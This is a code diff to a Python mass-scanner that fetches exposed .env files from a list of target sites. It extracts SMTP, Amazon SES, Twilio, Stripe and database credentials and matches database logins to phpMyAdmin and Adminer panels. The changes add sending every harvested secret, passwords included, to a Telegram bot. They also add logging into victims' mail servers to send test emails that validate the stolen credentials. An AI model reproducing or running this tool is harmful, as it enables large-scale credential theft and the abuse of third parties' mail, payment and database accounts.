@@ -1,9 +1,19 @@
 import requests
 import os
 import re
+import smtplib
+from email.mime.text import MIMEText
 from multiprocessing.dummy import Pool as ThreadPool
 from time import time as timer
 from colorama import Fore, Style, init
+from datetime import datetime
+
+# --- User Config ---
+TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
+TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID'
+TEST_EMAIL_TO = 'emailtest@gmail.com'  # Where to send test emails
+
+RESULTS_DIR = f"Results_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
 
 init(autoreset=True)
 LIME = Fore.LIGHTGREEN_EX
@@ -38,9 +48,8 @@ adminer_paths = [
 found_urls = set()
 found_phpmyadmin = set()
 found_adminer = set()
-db_creds_dict = {}  # {site_base: (host, user, pass, name)}
+db_creds_dict = {}
 
-# Counter for findings
 findings = {
     "ENV": 0,
     "PMA": 0,
@@ -49,7 +58,7 @@ findings = {
     "DB": 0,
     "SMTP": 0,
     "STRIPE": 0,
-    "TWILLIO": 0
+    "TWILIO": 0
 }
 
 def print_findings():
@@ -62,20 +71,109 @@ def print_findings():
         f"DB : {findings['DB']}  "
         f"SMTP : {findings['SMTP']}  "
         f"STRIPE : {findings['STRIPE']}  "
-        f"TWILLIO : {findings['TWILLIO']}"
+        f"TWILIO : {findings['TWILIO']}"
         f"{Style.RESET_ALL}"
     )
-    
+
 def safe_find(pattern, text):
     m = re.search(pattern, text, re.MULTILINE)
     return m.group(1).strip() if m else ''
 
 def is_env_file(text):
-    return any(key in text for key in ["DB_HOST", "DB_USERNAME", "MAIL_HOST", "APP_KEY", "APP_ENV"])
+    env_keys = ["DB_HOST", "DB_USERNAME", "MAIL_HOST", "APP_KEY", "APP_ENV"]
+    found = sum(1 for key in env_keys if key in text)
+    if found >= 3 and not re.search(r'<html|<!DOCTYPE', text, re.IGNORECASE):
+        return True
+    return False
+
+def send_telegram(message, parse_mode=None):
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
+    if parse_mode:
+        data["parse_mode"] = parse_mode
+    try:
+        requests.post(url, data=data, timeout=10)
+    except Exception as e:
+        print(f"{Fore.LIGHTRED_EX}[TELEGRAM ERROR] {e}{Style.RESET_ALL}")
+
+def send_test_email(smtp_host, smtp_port, smtp_user, smtp_pass, mail_from, mail_to, from_name, url):
+    try:
+        msg = MIMEText("SMTP Test Message from ENV Finder Script.")
+        msg['Subject'] = 'SMTP Test'
+        msg['From'] = f"{from_name} <{mail_from}>"
+        msg['To'] = mail_to
+        server = smtplib.SMTP(smtp_host, int(smtp_port), timeout=10)
+        server.starttls()
+        server.login(smtp_user, smtp_pass)
+        server.sendmail(mail_from, [mail_to], msg.as_string())
+        server.quit()
+        print(f"{Fore.LIGHTGREEN_EX}[SMTP TEST SENT] to {mail_to}{Style.RESET_ALL}")
+        telegram_message = (
+            f"✅ <b>SMTP Test Success</b>\n"
+            f"<b>URL:</b> <code>{url}</code>\n"
+            f"<b>MAILHOST:</b> <code>{smtp_host}</code>\n"
+            f"<b>MAILPORT:</b> <code>{smtp_port}</code>\n"
+            f"<b>MAILUSER:</b> <code>{smtp_user}</code>\n"
+            f"<b>MAILPASS:</b> <code>{smtp_pass}</code>\n"
+            f"<b>MAILFROM:</b> <code>{mail_from}</code>\n"
+            f"<b>FROMNAME:</b> <code>{from_name}</code>\n"
+            f"<b>Test sent to:</b> <code>{mail_to}</code>"
+        )
+        send_telegram(telegram_message, parse_mode="HTML")
+        return True
+    except Exception as e:
+        print(f"{Fore.LIGHTRED_EX}[SMTP TEST FAILED] {e}{Style.RESET_ALL}")
+        telegram_message = (
+            f"❌ <b>SMTP Test Failed</b>\n"
+            f"<b>URL:</b> <code>{url}</code>\n"
+            f"<b>MAILHOST:</b> <code>{smtp_host}</code>\n"
+            f"<b>MAILPORT:</b> <code>{smtp_port}</code>\n"
+            f"<b>MAILUSER:</b> <code>{smtp_user}</code>\n"
+            f"<b>MAILPASS:</b> <code>{smtp_pass}</code>\n"
+            f"<b>MAILFROM:</b> <code>{mail_from}</code>\n"
+            f"<b>FROMNAME:</b> <code>{from_name}</code>\n"
+            f"<b>Test sent to:</b> <code>{mail_to}</code>\n"
+            f"<b>Error:</b> <code>{e}</code>"
+        )
+        send_telegram(telegram_message, parse_mode="HTML")
+        return False
+
+def grab_ses_smtp(url, text):
+    mail_driver = safe_find(r'^MAIL_DRIVER\s*=\s*(.*)', text)
+    mailhost = safe_find(r'^MAIL_HOST\s*=\s*(.*)', text)
+    if mail_driver.lower() == "ses" and ("email-smtp" in mailhost or ("amazonaws.com" in mailhost and "ses" in mailhost)):
+        mailport = safe_find(r'^MAIL_PORT\s*=\s*(.*)', text)
+        mailuser = safe_find(r'^MAIL_USERNAME\s*=\s*(.*)', text)
+        mailpass = safe_find(r'^MAIL_PASSWORD\s*=\s*(.*)', text)
+        mailfrom = safe_find(r'^MAIL_FROM_ADDRESS\s*=\s*(.*)', text)
+        fromname = safe_find(r'^MAIL_FROM_NAME\s*=\s*(.*)', text)
+        if mailuser and mailpass:
+            build = (
+                f"URL: {url}\n"
+                f"MAILHOST: {mailhost}\n"
+                f"MAILPORT: {mailport}\n"
+                f"MAILUSER: {mailuser}\n"
+                f"MAILPASS: {mailpass}\n"
+                f"MAILFROM: {mailfrom}\n"
+                f"FROMNAME: {fromname}\n"
+            )
+            with open(f'{RESULTS_DIR}/SMTP_SES.txt', 'a', encoding='utf-8') as f:
+                f.write(build + '\n')
+                f.flush()
+            findings["SES"] += 1
+            findings["SMTP"] += 1
+            print(f"{Fore.LIGHTGREEN_EX}[SAVED SES SMTP] SMTP_SES.txt{Style.RESET_ALL}")
+            send_telegram(f"SES SMTP found:\n{build}")
+            send_test_email(mailhost, mailport, mailuser, mailpass, mailfrom, TEST_EMAIL_TO, fromname, url)
+            return True
+    return False
 
 def grab_smtp(url, text):
+    mail_driver = safe_find(r'^MAIL_DRIVER\s*=\s*(.*)', text)
+    mailhost = safe_find(r'^MAIL_HOST\s*=\s*(.*)', text)
+    if mail_driver.lower() == "ses" and ("email-smtp" in mailhost or ("amazonaws.com" in mailhost and "ses" in mailhost)):
+        return False  # SES SMTP handled by grab_ses_smtp
     if 'MAIL_HOST' in text:
-        mailhost = safe_find(r'^MAIL_HOST\s*=\s*(.*)', text)
         mailport = safe_find(r'^MAIL_PORT\s*=\s*(.*)', text)
         mailuser = safe_find(r'^MAIL_USERNAME\s*=\s*(.*)', text)
         mailpass = safe_find(r'^MAIL_PASSWORD\s*=\s*(.*)', text)
@@ -83,55 +181,42 @@ def grab_smtp(url, text):
         fromname = safe_find(r'^MAIL_FROM_NAME\s*=\s*(.*)', text)
         if not mailuser or not mailpass or mailuser.lower() == "null" or mailpass.lower() == "null":
             return False
-        build = f'URL: {url}\nMAILHOST: {mailhost}\nMAILPORT: {mailport}\nMAILUSER: {mailuser}\nMAILPASS: {mailpass}\nMAILFROM: {mailfrom}\nFROMNAME: {fromname}'
-        build = build.replace('\r', '')
-        if 'sendgrid' in mailhost:
-            filename = 'sendgrid.txt'
-        elif 'office365' in mailhost or 'outlook.office365.com' in mailhost or 'smtp.office365.com' in mailhost:
-            filename = 'office.txt'
-        elif '1and1' in mailhost or '1und1' in mailhost:
-            filename = '1and1.txt'
-        elif 'zoho' in mailhost:
-            filename = 'zoho.txt'
-        elif 'mandrillapp' in mailhost or 'mandrill' in mailhost:
-            filename = 'mandrill.txt'
-        elif 'mailgun' in mailhost:
-            filename = 'mailgun.txt'
-        else:
-            filename = 'SMTP_RANDOM.txt'
-        with open(f'Results/{filename}', 'a', encoding='utf-8') as f:
-            f.write(build + '\n\n')
+        build = (
+            f"URL: {url}\n"
+            f"MAILHOST: {mailhost}\n"
+            f"MAILPORT: {mailport}\n"
+            f"MAILUSER: {mailuser}\n"
+            f"MAILPASS: {mailpass}\n"
+            f"MAILFROM: {mailfrom}\n"
+            f"FROMNAME: {fromname}\n"
+        )
+        filename = 'SMTP_RANDOM.txt'
+        with open(f'{RESULTS_DIR}/{filename}', 'a', encoding='utf-8') as f:
+            f.write(build + '\n')
+            f.flush()
         findings["SMTP"] += 1
-        print_findings()
-        return True
-    return False
-
-def grab_aws(url, text):
-    aws_key = safe_find(r'^AWS_ACCESS_KEY_ID\s*=\s*(.*)', text)
-    aws_secret = safe_find(r'^AWS_SECRET_ACCESS_KEY\s*=\s*(.*)', text)
-    aws_region = safe_find(r'^AWS_DEFAULT_REGION\s*=\s*(.*)', text)
-    if aws_key and aws_secret:
-        build = f'URL: {url}\nAWS_ACCESS_KEY_ID: {aws_key}\nAWS_SECRET_ACCESS_KEY: {aws_secret}\nAWS_DEFAULT_REGION: {aws_region}'
-        with open('Results/aws.txt', 'a', encoding='utf-8') as f:
-            f.write(build + '\n\n')
-        # SES detection: region contains 'ses' or key starts with 'ASIA' (common for SES)
-        if (aws_region and 'ses' in aws_region.lower()) or (aws_key and aws_key.startswith('ASIA')):
-            findings["SES"] += 1
-            print_findings()
+        print(f"{Fore.LIGHTGREEN_EX}[SAVED SMTP] {filename}{Style.RESET_ALL}")
+        send_telegram(f"SMTP found:\n{build}")
+        send_test_email(mailhost, mailport, mailuser, mailpass, mailfrom, TEST_EMAIL_TO, fromname, url)
         return True
     return False
 
 def grab_twilio(url, text):
     sid = safe_find(r'^TWILIO_ACCOUNT_SID\s*=\s*(.*)', text)
     token = safe_find(r'^TWILIO_AUTH_TOKEN\s*=\s*(.*)', text)
-    api_key = safe_find(r'^TWILIO_API_KEY\s*=\s*(.*)', text)
-    api_secret = safe_find(r'^TWILIO_API_SECRET\s*=\s*(.*)', text)
-    if sid and token:
-        build = f'URL: {url}\nTWILIO_ACCOUNT_SID: {sid}\nTWILIO_AUTH_TOKEN: {token}\nTWILIO_API_KEY: {api_key}\nTWILIO_API_SECRET: {api_secret}'
-        with open('Results/twilio.txt', 'a', encoding='utf-8') as f:
-            f.write(build + '\n\n')
-        findings["TWILLIO"] += 1
-        print_findings()
+    phone = safe_find(r'^TWILIO_PHONE_NUMBER\s*=\s*(.*)', text)
+    if sid and token and phone:
+        build = (
+            f"TWILIO_ACCOUNT_SID={sid}\n"
+            f"TWILIO_AUTH_TOKEN={token}\n"
+            f"TWILIO_PHONE_NUMBER={phone}\n"
+        )
+        with open(f'{RESULTS_DIR}/twilio.txt', 'a', encoding='utf-8') as f:
+            f.write(build + '\n')
+            f.flush()
+        findings["TWILIO"] += 1
+        print(f"{Fore.LIGHTGREEN_EX}[SAVED TWILIO] twilio.txt{Style.RESET_ALL}")
+        send_telegram(f"Twilio credentials found:\n{build}")
         return True
     return False
 
@@ -140,10 +225,11 @@ def grab_stripe(url, text):
     stripe_secret = safe_find(r'^STRIPE_SECRET\s*=\s*(.*)', text)
     if stripe_key and stripe_secret:
         build = f'URL: {url}\nSTRIPE_KEY: {stripe_key}\nSTRIPE_SECRET: {stripe_secret}'
-        with open('Results/stripe.txt', 'a', encoding='utf-8') as f:
+        with open(f'{RESULTS_DIR}/stripe.txt', 'a', encoding='utf-8') as f:
             f.write(build + '\n\n')
+            f.flush()
         findings["STRIPE"] += 1
-        print_findings()
+        print(f"{Fore.LIGHTGREEN_EX}[SAVED STRIPE] stripe.txt{Style.RESET_ALL}")
         return True
     return False
 
@@ -155,13 +241,22 @@ def grab_db(site_base, url, text):
     db_user = safe_find(r'^DB_USERNAME\s*=\s*(.*)', text)
     db_pass = safe_find(r'^DB_PASSWORD\s*=\s*(.*)', text)
     creds_tuple = (db_conn, db_host, db_port, db_name, db_user, db_pass)
-    if all(creds_tuple):
+    if all(creds_tuple) and db_user and db_pass and db_user.lower() != "null" and db_pass.lower() != "null":
         db_creds_dict[site_base] = creds_tuple
-        build = f'URL: {url}\nDB_CONNECTION: {db_conn}\nDB_HOST: {db_host}\nDB_PORT: {db_port}\nDB_DATABASE: {db_name}\nDB_USERNAME: {db_user}\nDB_PASSWORD: {db_pass}'
-        with open('Results/Database.txt', 'a', encoding='utf-8') as f:
+        build = (
+            f'URL: {url}\n'
+            f'DB_CONNECTION: {db_conn}\n'
+            f'DB_HOST: {db_host}\n'
+            f'DB_PORT: {db_port}\n'
+            f'DB_DATABASE: {db_name}\n'
+            f'DB_USERNAME: {db_user}\n'
+            f'DB_PASSWORD: {db_pass}'
+        )
+        with open(f'{RESULTS_DIR}/Database.txt', 'a', encoding='utf-8') as f:
             f.write(build + '\n\n')
+            f.flush()
         findings["DB"] += 1
-        print_findings()
+        print(f"{Fore.LIGHTGREEN_EX}[SAVED DB] Database.txt{Style.RESET_ALL}")
         return creds_tuple
     return None
 
@@ -175,68 +270,63 @@ def format_phpmyadmin(url, creds):
 
 def format_adminer(url, creds):
     if creds:
-        db_host = creds[1]
         db_user = creds[4]
         db_pass = creds[5]
-        db_name = creds[3]
-        return f"{url}\nHOST: {db_host}\nUSER: {db_user}\nPASS: {db_pass}\nNAME: {db_name}\n\n"
+        return f"{url}\nUSER: {db_user}\nPASS: {db_pass}\n\n"
     else:
         return ""
 
 def check_phpmyadmin(site_base):
-    creds = db_creds_dict.get(site_base)
-    if not creds:
+    creds = db_creds_dict.get(site_base, None)
+    if not creds or not creds[4] or not creds[5] or creds[4].lower() == "null" or creds[5].lower() == "null":
         return
-    for pma_path in phpmyadmin_paths:
-        url = site_base.rstrip('/') + pma_path
+    for phpmyadmin_path in phpmyadmin_paths:
+        url = site_base.rstrip('/') + phpmyadmin_path
         try:
             resp = requests.get(url, timeout=10)
-            if resp.status_code == 200 and ("phpmyadmin" in resp.text.lower() or "phpMyAdmin" in resp.text):
+            if resp.status_code == 200 and "phpMyAdmin" in resp.text:
                 if url not in found_phpmyadmin:
                     found_phpmyadmin.add(url)
-                    print(f"{Fore.LIGHTGREEN_EX}[phpMyAdmin FOUND] {url}{Style.RESET_ALL}")
-                    with open('Results/phpmyadmin.txt', 'a', encoding='utf-8') as f:
+                    print(f"{Fore.LIGHTGREEN_EX}[FOUND PMA] {url}{Style.RESET_ALL}")
+                    with open(f'{RESULTS_DIR}/phpmyadmin.txt', 'a', encoding='utf-8') as f:
                         f.write(format_phpmyadmin(url, creds))
+                        f.flush()
                     findings["PMA"] += 1
                     print_findings()
-                break
-        except Exception:
-            continue
+        except Exception as e:
+            print(f"{Fore.LIGHTRED_EX}[ERROR PMA] {url} ({e}){Style.RESET_ALL}")
 
 def check_adminer(site_base):
-    creds = db_creds_dict.get(site_base)
-    if not creds:
+    creds = db_creds_dict.get(site_base, None)
+    if not creds or not creds[4] or not creds[5] or creds[4].lower() == "null" or creds[5].lower() == "null":
         return
-    for adm_path in adminer_paths:
-        url = site_base.rstrip('/') + adm_path
+    for adminer_path in adminer_paths:
+        url = site_base.rstrip('/') + adminer_path
         try:
             resp = requests.get(url, timeout=10)
-            if resp.status_code == 200 and ("adminer" in resp.text.lower()):
+            if resp.status_code == 200 and ("Adminer" in resp.text or "adminer" in resp.text):
                 if url not in found_adminer:
                     found_adminer.add(url)
-                    print(f"{Fore.LIGHTGREEN_EX}[Adminer FOUND] {url}{Style.RESET_ALL}")
-                    with open('Results/adminer.txt', 'a', encoding='utf-8') as f:
+                    print(f"{Fore.LIGHTGREEN_EX}[FOUND ADM] {url}{Style.RESET_ALL}")
+                    with open(f'{RESULTS_DIR}/adminer.txt', 'a', encoding='utf-8') as f:
                         f.write(format_adminer(url, creds))
+                        f.flush()
                     findings["ADM"] += 1
                     print_findings()
-                break
-        except Exception:
-            continue
+        except Exception as e:
+            print(f"{Fore.LIGHTRED_EX}[ERROR ADM] {url} ({e}){Style.RESET_ALL}")
+
+def is_site_alive(site):
+    try:
+        resp = requests.get(site, timeout=10)
+        return resp.status_code < 400
+    except:
+        return False
 
 def get_site_base(site):
-    m = re.match(r'(https?://[^/]+)', site)
-    return m.group(1) if m else site
-
-def is_site_alive(site_base):
-    try:
-        for test_path in ['', '/robots.txt']:
-            url = site_base.rstrip('/') + test_path
-            resp = requests.get(url, timeout=10)
-            if resp.status_code < 500:
-                return True
-        return False
-    except Exception:
-        return False
+    if site.endswith('/'):
+        site = site[:-1]
+    return site
 
 def exploit(target):
     if '://' not in target:
@@ -257,15 +347,19 @@ def exploit(target):
                 if exploit_path not in found_urls:
                     found_urls.add(exploit_path)
                     print(f"{Fore.LIGHTGREEN_EX}[FOUND] {exploit_path}{Style.RESET_ALL}")
-                    with open('Results/env.txt', 'a', encoding='utf-8') as f:
+                    with open(f'{RESULTS_DIR}/env.txt', 'a', encoding='utf-8') as f:
                         f.write(exploit_path + '\n')
+                        f.flush()
                     findings["ENV"] += 1
-                    print_findings()
-                    grab_smtp(exploit_path, resp.text)
-                    grab_aws(exploit_path, resp.text)
+
+                    ses_found = grab_ses_smtp(exploit_path, resp.text)
+                    if not ses_found:
+                        grab_smtp(exploit_path, resp.text)
                     grab_twilio(exploit_path, resp.text)
                     grab_stripe(exploit_path, resp.text)
                     grab_db(site_base, exploit_path, resp.text)
+
+                    print_findings()
                 break
             else:
                 print(f"{Fore.LIGHTYELLOW_EX}[FAILED] {exploit_path} (status {resp.status_code}){Style.RESET_ALL}")
@@ -274,53 +368,26 @@ def exploit(target):
     check_phpmyadmin(site_base)
     check_adminer(site_base)
 
-def identify_directory():
-    print(f'{Fore.LIGHTCYAN_EX}[?] Checking Results folder....{Style.RESET_ALL}')
-    try:
-        os.mkdir('Results')
-        print(f'{Fore.LIGHTGREEN_EX}[!] Folder Results Created !{Style.RESET_ALL}')
-    except:
-        print(f'{Fore.LIGHTYELLOW_EX}[!] Folder Results already exist{Style.RESET_ALL}')
-    print("")
+def main():
+    if not os.path.exists(RESULTS_DIR):
+        os.makedirs(RESULTS_DIR)
 
-def main_scanner():
-    quest = input(f'{Fore.LIGHTCYAN_EX}[x] List site : {Style.RESET_ALL}')
-    with open(quest, 'r', encoding='utf-8') as f:
-        read_list = f.read().splitlines()
-    for read_line in read_list:
-        exploit(read_line)
+    targets_file = input(f"{LIME}{Style.BRIGHT}Enter the filename containing target domains: {Style.RESET_ALL}").strip()
+    if not os.path.isfile(targets_file):
+        print(f"{Fore.LIGHTRED_EX}File not found: {targets_file}{Style.RESET_ALL}")
+        return
 
-def threaded_scanner():
-    quest = input(f'{Fore.LIGHTCYAN_EX}[x] List site : {Style.RESET_ALL}')
-    while True:
-        try:
-            ask_thread = int(input(f'{Fore.LIGHTCYAN_EX}Thread : (1-10) {Style.RESET_ALL}'))
-            if 1 <= ask_thread <= 10:
-                break
-            else:
-                print(f"{Fore.LIGHTRED_EX}Please enter a number between 1 and 10.{Style.RESET_ALL}")
-        except ValueError:
-            print(f"{Fore.LIGHTRED_EX}Invalid input. Please enter a number.{Style.RESET_ALL}")
-    with open(quest, 'r', encoding='utf-8') as f:
-        read_list = f.read().splitlines()
+    with open(targets_file, 'r', encoding='utf-8') as f:
+        targets = [line.strip() for line in f if line.strip()]
+
+    pool = ThreadPool(10)
     start = timer()
-    pp = ThreadPool(ask_thread)
-    pp.map(exploit, read_list)
-    pp.close()
-    pp.join()
-    print(f"{Fore.LIGHTGREEN_EX}Done in {timer() - start:.2f} seconds{Style.RESET_ALL}")
-
-def banner_menu():
-    print(f'{Fore.LIGHTCYAN_EX}1. With Thread (1-10){Style.RESET_ALL}')
-    print(f'{Fore.LIGHTCYAN_EX}2. Without Thread{Style.RESET_ALL}')
+    pool.map(exploit, targets)
+    pool.close()
+    pool.join()
+    end = timer()
+    print(f"\n{Fore.LIGHTCYAN_EX}Scan completed in {end - start:.2f} seconds.{Style.RESET_ALL}")
+    print_findings()
 
 if __name__ == "__main__":
-    identify_directory()
-    banner_menu()
-    ask = input(f'{Fore.LIGHTCYAN_EX}[x] choose : {Style.RESET_ALL}')
-    if ask == '1':
-        threaded_scanner()
-    elif ask == '2':
-        main_scanner()
-    else:
-        print(f'{Fore.LIGHTRED_EX}Wrong input !!!{Style.RESET_ALL}')
+    main()
